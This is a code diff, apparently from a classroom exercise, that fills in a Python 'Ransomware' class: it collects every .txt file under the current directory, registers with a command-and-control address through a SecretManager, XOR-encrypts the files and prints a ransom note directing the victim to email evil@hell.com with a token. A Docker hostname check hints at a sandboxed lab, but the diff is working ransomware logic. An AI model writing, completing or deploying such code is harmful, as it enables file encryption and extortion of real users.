@@ -22,6 +22,7 @@ ENCRYPT_MESSAGE = """
 Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
 """
 class Ransomware:
+
     def __init__(self) -> None:
         self.check_hostname_is_docker()
     
@@ -36,11 +37,25 @@ class Ransomware:
 
     def get_files(self, filter:str)->list:
         # return all files matching the filter
-        raise NotImplemented()
+        path = Path(".")
+        return [str(file) for file in path.rglob(filter)]
 
     def encrypt(self):
-        # main function for encrypting (see PDF)
-        raise NotImplemented()
+        # List all the .txt files
+        txt_files = self.get_files("*.txt")
+
+        # Create an instance of SecretManager
+        secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)
+
+        # Call the setup() method of SecretManager
+        secret_manager.setup()
+
+        # Encrypt the files using the xorfiles() method of SecretManager
+        secret_manager.xorfiles(txt_files)
+
+        # Display a message for the victim to contact the attacker, including the hex token
+        hex_token = secret_manager.get_hex_token()
+        print(ENCRYPT_MESSAGE.format(token=hex_token))
 
     def decrypt(self):
         # main function for decrypting (see PDF)
